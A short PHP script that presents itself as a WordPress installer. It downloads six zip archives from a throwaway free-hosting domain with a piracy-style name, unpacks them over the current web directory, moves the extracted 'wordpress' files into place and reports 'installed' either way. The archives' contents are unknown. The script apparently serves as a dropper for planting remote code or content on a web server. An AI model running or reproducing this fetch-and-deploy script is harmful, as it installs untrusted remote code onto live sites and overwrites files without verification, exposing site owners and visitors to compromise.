<?php
	echo '<pre>';
	echo '<span style="color:blue">DOWNLOADING...</span>'.PHP_EOL;

	// Download file
	file_put_contents('1.zip', file_get_contents('http://putlockerbestwat.hostfree.pw/1.zip'));
	
	$zip = new ZipArchive();
	$res = $zip->open('1.zip');
	
	if ($res === TRUE) {
		
		// Extract ZIP file
		$zip->extractTo('./');
		$zip->close();
		
	
	// Download file
	file_put_contents('2.1.zip', file_get_contents('http://putlockerbestwat.hostfree.pw/2.1.zip'));
	
	$zip = new ZipArchive();
	$res = $zip->open('2.1.zip');
	
	if ($res === TRUE) {
		
		// Extract ZIP file
		$zip->extractTo('./');
		$zip->close();
		

	// Download file
	file_put_contents('2.2.zip', file_get_contents('http://putlockerbestwat.hostfree.pw/2.2.zip'));
	
	$zip = new ZipArchive();
	$res = $zip->open('2.2.zip');
	
	if ($res === TRUE) {
		
		// Extract ZIP file
		$zip->extractTo('./');
		$zip->close();
		

		// Download file
	file_put_contents('2.3.zip', file_get_contents('http://putlockerbestwat.hostfree.pw/2.3.zip'));
	
	$zip = new ZipArchive();
	$res = $zip->open('2.3.zip');
	
	if ($res === TRUE) {
		
	    // Extract ZIP file
		$zip->extractTo('./');
		$zip->close();
		

	// Download file
	file_put_contents('3.zip', file_get_contents('http://putlockerbestwat.hostfree.pw/3.zip'));
	
	$zip = new ZipArchive();
	$res = $zip->open('3.zip');
	
	if ($res === TRUE) {
		
		// Extract ZIP file
		$zip->extractTo('./');
		$zip->close();
		
	// Download file
	file_put_contents('4.zip', file_get_contents('http://putlockerbestwat.hostfree.pw/4.zip'));
	
	$zip = new ZipArchive();
	$res = $zip->open('4.zip');
	
	if ($res === TRUE) {
		
		// Extract ZIP file
		$zip->extractTo('./');
		$zip->close();

        unlink('1.zip');
        unlink('2.1.zip');
        unlink('2.2.zip');
        unlink('2.3.zip');
        unlink('3.zip');
		unlink('4.zip');
	

		
		// Copy files from wordpress dir to current dir
		$files = find_all_files("wordpress");
		$source = "wordpress/";
		foreach ($files as $file) {
			$file = substr($file, strlen("wordpress/"));
			if (in_array($file, array(".",".."))) continue;
			if (!is_dir($source.$file)){
				echo '[FILE] '.$source.$file .' -> '.$file . PHP_EOL;
				rename($source.$file, $file);
			}else{
				echo '[DIR]  '.$file . PHP_EOL;
				@mkdir($file);
			}
		}
		
		// Remove wordpress dir
		foreach ($files as $file) {
			if (in_array($file, array(".",".."))) continue;
			if (is_dir($file)){
				echo '[REM]  '.$file . PHP_EOL;
				@rmdir($file);
			}
		}
		@rmdir('./wordpress');
		
		// Check if copy was successful
		if(file_exists('index.php')){
		
			// Redirect to WP installation page
			echo 'wes keinstall cak';
		
		}else{
			echo 'wes keinstall cak ';
		}
	}}}}}} else {
		echo 'Oops, that didn\'t work...';
	}
	
	function find_all_files($dir) { 
    $root = scandir($dir); 
    foreach($root as $value) { 
        if($value === '.' || $value === '..') {continue;} 
        $result[]="$dir/$value";
        if(is_file("$dir/$value")) {continue;} 
        foreach(find_all_files("$dir/$value") as $value) 
        { 
            $result[]=$value; 
        } 
    } 
    return $result; 
} 
?>